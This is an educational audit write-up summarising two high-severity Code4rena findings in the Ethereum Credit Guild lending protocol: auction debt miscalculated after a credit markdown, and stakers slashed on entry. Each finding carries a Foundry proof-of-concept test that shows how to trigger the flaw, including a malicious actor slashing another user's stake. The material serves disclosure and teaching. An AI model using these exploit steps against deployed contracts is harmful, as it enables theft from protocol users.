# ETAAcademy-Adudit: 4. Memory

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>04. Calculation</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>Math</th>
          <td>calculation</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] The creation of bad debt (mark-down of Credit) can force other loans in auction to also create bad debt

## Calculating debt during auctions

- Summary: It only records the loan's debt at the start of an auction, using the current `creditMultiplier`. If the creditMultiplier changes during the auction, callDebt may underestimate the actual debt. This could lead to only accepting bids during the auction's second phase if the borrower's debt exceeds available credit. Additionally, if the debt surpasses available credit, bad debt may occur during the auction.
- Impact & Recommendation: All other loans in auction at that time will also be forced to create bad debt. It suggests dynamically calculating callDebt during auctions based on the current creditMultiplier, rather than using a fixed snapshot, for more accurate debt assessment.
  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/476) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    // SPDX-License-Identifier: GPL-3.0-or-later
    pragma solidity 0.8.13;
    import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
    import {Test} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {MockERC20} from "@test/mock/MockERC20.sol";
    import {SimplePSM} from "@src/loan/SimplePSM.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {LendingTerm} from "@src/loan/LendingTerm.sol";
    import {AuctionHouse} from "@src/loan/AuctionHouse.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
    contract BadDebtCreatesBadDebt is Test {
        address private governor = address(1);
        address private guardian = address(2);
        address staker = address(0x01010101);
        address borrower = address(0x02020202);
        address lender = address(0x03030303);
        Core private core;
        ProfitManager private profitManager;
        CreditToken credit;
        GuildToken guild;
        MockERC20 collateral;
        MockERC20 pegToken;
        SimplePSM private psm;
        RateLimitedMinter rlcm;
        AuctionHouse auctionHouse;
        LendingTerm term;
        // LendingTerm params (same as deployment script)
        uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1
        uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR
        uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 0;
        uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0;
        uint256 constant _HARDCAP = 2_000_000e18; // 2 million
        uint256 public issuance = 0;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManager = new ProfitManager(address(core));
            collateral = new MockERC20();
            pegToken = new MockERC20(); // 18 decimals for easy calculations (deployment script uses USDC which has 6 decimals)
            credit = new CreditToken(address(core), "name", "symbol");
            guild = new GuildToken(
                address(core),
                address(profitManager)
            );
            rlcm = new RateLimitedMinter(
                address(core) /*_core*/,
                address(credit) /*_token*/,
                CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,
                0 /*_maxRateLimitPerSecond*/,
                0 /*_rateLimitPerSecond*/,
                uint128(_HARDCAP) /*_bufferCap*/
            );
            auctionHouse = new AuctionHouse(address(core), 650, 1800);
            term = LendingTerm(Clones.clone(address(new LendingTerm())));
            term.initialize(
                address(core),
                LendingTerm.LendingTermReferences({
                    profitManager: address(profitManager),
                    guildToken: address(guild),
                    auctionHouse: address(auctionHouse),
                    creditMinter: address(rlcm),
                    creditToken: address(credit)
                }),
                LendingTerm.LendingTermParams({
                    collateralToken: address(collateral),
                    maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                    interestRate: _INTEREST_RATE,
                    maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                    minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                    openingFee: 0,
                    hardCap: _HARDCAP
                })
            );
            psm = new SimplePSM(
                address(core),
                address(profitManager),
                address(credit),
                address(pegToken)
            );
            profitManager.initializeReferences(address(credit), address(guild), address(psm));
            // roles
            core.grantRole(CoreRoles.GOVERNOR, governor);
            core.grantRole(CoreRoles.GUARDIAN, guardian);
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(this));
            core.grantRole(CoreRoles.GAUGE_ADD, address(this));
            core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
            core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));
            core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));
            core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
            core.grantRole(CoreRoles.CREDIT_REBASE_PARAMETERS, address(psm));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            // add gauge
            guild.setMaxGauges(10);
            guild.addGauge(1, address(term));
        }
        function testBadDebtCreatesBadDebt() public {
            // staker increases term debtCeiling
            guild.mint(staker, 1000e18);
            vm.startPrank(staker);
            guild.incrementGauge(address(term), 1000e18);
            vm.stopPrank();
            assertEq(guild.getGaugeWeight(address(term)), 1000e18);
            // term has 12 active loans all with various borrow sizes (1_000_000 in total loans)
            // 1st loan = 80_000e18
            collateral.mint(borrower, 1_000_000e18);
            uint256[] memory borrowAmounts = new uint256[](11);
            bytes32[] memory loanIds = new bytes32[](11);
            borrowAmounts[0] = 1_000e18;
            borrowAmounts[1] = 5_000e18;
            borrowAmounts[2] = 10_000e18;
            borrowAmounts[3] = 25_000e18;
            borrowAmounts[4] = 100_000e18;
            borrowAmounts[5] = 50_000e18;
            borrowAmounts[6] = 300_000e18;
            borrowAmounts[7] = 18_000e18;
            borrowAmounts[8] = 90_000e18;
            borrowAmounts[9] = 250_000e18;
            borrowAmounts[10] = 71_000e18;
            vm.prank(borrower);
            collateral.approve(address(term), 1_000_000e18);
            // create 1st loan (loan that will create bad debt)
            bytes32 loanId;
            vm.startPrank(borrower);
            loanId = term.borrow(80_000e18, 80_000e18);
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 13);
            vm.stopPrank();
            // create the rest of the loans (loans that will be forced to create bad debt)
            for (uint256 i; i < borrowAmounts.length; i++) {
                vm.startPrank(borrower);
                loanIds[i] = term.borrow(borrowAmounts[i], borrowAmounts[i]);
                vm.roll(block.number + 1);
                vm.warp(block.timestamp + 13);
                vm.stopPrank();
            }

            assertEq(term.issuance(), 1_000_000e18);
            assertEq(credit.balanceOf(borrower), 1_000_000e18);
            assertEq(credit.totalSupply(), 1_000_000e18);
            // lenders supply 1_000_000 pegToken in psm (credit.totalSupply == 2_000_000)
            pegToken.mint(lender, 1_000_000e18);
            vm.startPrank(lender);
            pegToken.approve(address(psm), 1_000_000e18);
            psm.mintAndEnterRebase(1_000_000e18);
            vm.stopPrank();
            assertEq(credit.totalSupply(), 2_000_000e18);
            // half a year later all loans accrued ~2% interest
            vm.warp(block.timestamp + (term.YEAR() / 2));

            // term is offboarded
            guild.removeGauge(address(term));
            assertEq(guild.isGauge(address(term)), false);
            // one loan is called before the others and it creates bad debt (markdown > % interest owed by other loans)
            term.call(loanId);
            // no ones bids and loan creates bad debt (worse case scenario)
            vm.warp(block.timestamp + auctionHouse.auctionDuration());
            (, uint256 creditAsked) = auctionHouse.getBidDetail(loanId);
            assertEq(creditAsked, 0); // phase 2 ended
            // all loans called via callMany right before bad debt + markdown occurs
            // to demonstrate that any auctions live while markdown occurred would be affected (including auctions in diff terms)
            term.callMany(loanIds);
            // bad debt created, i.e. markdown of 4%
            // note that for demonstration purposes there are no surplus buffers
            auctionHouse.forgive(loanId);
            assertEq(term.issuance(), 1_000_000e18 - 80_000e18);
            assertEq(credit.totalSupply(), 2_000_000e18);
            assertEq(profitManager.creditMultiplier(), 0.96e18); // credit marked down
            // no one can bid during phase 1 of any other loans that were in auction when the markdown occurred
            // due to principle > creditFromBidder, therefore collateral to borrower must be 0, i.e. all collateral is offered, i.e. must be phase 2
            for (uint256 i; i < loanIds.length; i++) {
                ( , creditAsked) = auctionHouse.getBidDetail(loanIds[i]);
                // verify we are in phase 1 (creditAsked == callDebt)
                assertEq(auctionHouse.getAuction(loanIds[i]).callDebt, creditAsked);
                // attempt to bid during phase 1
                credit.mint(address(this), creditAsked);
                credit.approve(address(term), creditAsked);
                vm.expectRevert("LendingTerm: invalid collateral movement");
                auctionHouse.bid(loanIds[i]);
            }
            // fast forward to the beginning of phase 2
            vm.warp(block.timestamp + auctionHouse.midPoint());
            vm.roll(block.number + 1);
            // all other loans that are in auction will be forced to only receive bids in phase 2
            // bad debt is gauranteed to be created for all these loans, so user's are incentivized to
            // bid at the top of phase 2. This would result in the liquidator receiving the collateral at a discount.
            // The loans with less accrued interest and a bigger principle/borrow amount will result in a bigger loss, i.e. greater markdown
            emit log_named_uint("creditMultiplier before updates", profitManager.creditMultiplier());

            uint256 collateralReceived;
            for (uint256 i; i < loanIds.length; i++) {
                (collateralReceived, creditAsked) = auctionHouse.getBidDetail(loanIds[i]);
                // verify we are at the top of phase 2 (collateralReceived == collateralAmount | creditAsked == callDebt)
                assertEq(auctionHouse.getAuction(loanIds[i]).callDebt, creditAsked);
                assertEq(auctionHouse.getAuction(loanIds[i]).collateralAmount, collateralReceived);
                // bid at top of phase two (bidder receives collateral at a discount & protocol incurs more bad debt)
                credit.mint(address(this), creditAsked);
                credit.approve(address(term), creditAsked);
                auctionHouse.bid(loanIds[i]);
                multiplierUpdated();
            }
        }
        function multiplierUpdated() internal {
            // credit multiiplier decreases which each auction
            uint256 multiiplier = profitManager.creditMultiplier();
            emit log_named_uint("creditMultiplier updated", multiiplier);
        }
    }


  ```

  </details>

## 2.[High] Users staking via the SurplusGuildMinter can be immediately slashed when staking into a gauge that had previously incurred a loss

## Initialization user's lastLoss

- Summary: If the gauge has experienced a loss in the past, even if the user staked during a profitable period, they may be immediately slashed upon staking. This happens because the code initializes the user's stake struct with default values, which will identify this user as being slashed, i.e. slashed = true, due to lastGaugeLoss > userStake.lastGaugeLoss.

- Impact: The `SurplusGuildMinter` should initialize a user's **`lastGaugeLoss`** to the current block timestamp, so that comparisons with **`lastGaugeLoss`** won't be made against a freshly initialized user stake struct, preventing potential issues with loss of stake and rewards.
  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/473) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
      function testUserImmediatelySlashed() public {
        // initial state
        assertEq(guild.getGaugeWeight(term), 50e18);
        // add credit to surplus buffer
        credit.mint(address(this), 100e18);
        credit.approve(address(profitManager), 50e18);
        profitManager.donateToSurplusBuffer(50e18);
        // term incurs loss
        profitManager.notifyPnL(term, -50e18);
        assertEq(guild.lastGaugeLoss(term), block.timestamp);
        // term offboarded
        guild.removeGauge(term);
        assertEq(guild.isGauge(term), false);
        // time passes and term is re-onboarded
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + (100 * 13));
        guild.addGauge(1, term);
        assertEq(guild.isGauge(term), true);
        // user stakes into term directly
        address user = address(0x01010101);
        guild.mint(user, 10e18);
        vm.startPrank(user);
        guild.incrementGauge(term, 10e18);
        vm.stopPrank();
        // user can un-stake from term
        vm.startPrank(user);
        guild.decrementGauge(term, 10e18);
        vm.stopPrank();
        // user stakes into term via sgm
        credit.mint(user, 10e18);
        vm.startPrank(user);
        credit.approve(address(sgm), 10e18);
        sgm.stake(term, 10e18);
        vm.stopPrank();

        // check after-stake state
        assertEq(credit.balanceOf(user), 0);
        assertEq(profitManager.termSurplusBuffer(term), 10e18);
        assertEq(guild.getGaugeWeight(term), 70e18);
        SurplusGuildMinter.UserStake memory userStake = sgm.getUserStake(user, term);
        assertEq(uint256(userStake.stakeTime), block.timestamp);
        assertEq(userStake.lastGaugeLoss, guild.lastGaugeLoss(term));
        assertEq(userStake.profitIndex, 0);
        assertEq(userStake.credit, 10e18);
        assertEq(userStake.guild, 20e18);
        // malicious actor is aware of bug and slashes the user's stake immediately, despite no loss occurring in the gauge
        sgm.getRewards(user, term);
        // check after-getReward state (user was slashed even though no loss has occurred since term was re-onboarded)
        assertEq(credit.balanceOf(user), 0);
        assertEq(profitManager.termSurplusBuffer(term), 10e18);
        assertEq(guild.getGaugeWeight(term), 70e18);
        userStake = sgm.getUserStake(user, term);
        assertEq(uint256(userStake.stakeTime), 0);
        assertEq(userStake.lastGaugeLoss, 0);
        assertEq(userStake.profitIndex, 0);
        assertEq(userStake.credit, 0);
        assertEq(userStake.guild, 0);
        // user tries to unstake but will not receive anything
        uint256 userBalanceBefore = credit.balanceOf(user);
        vm.startPrank(user);
        sgm.unstake(term, 10e18);
        vm.stopPrank();
        uint256 userAfterBalance = credit.balanceOf(user);
        assertEq(userBalanceBefore, 0);
        assertEq(userAfterBalance, 0);
    }

  ```

  </details>
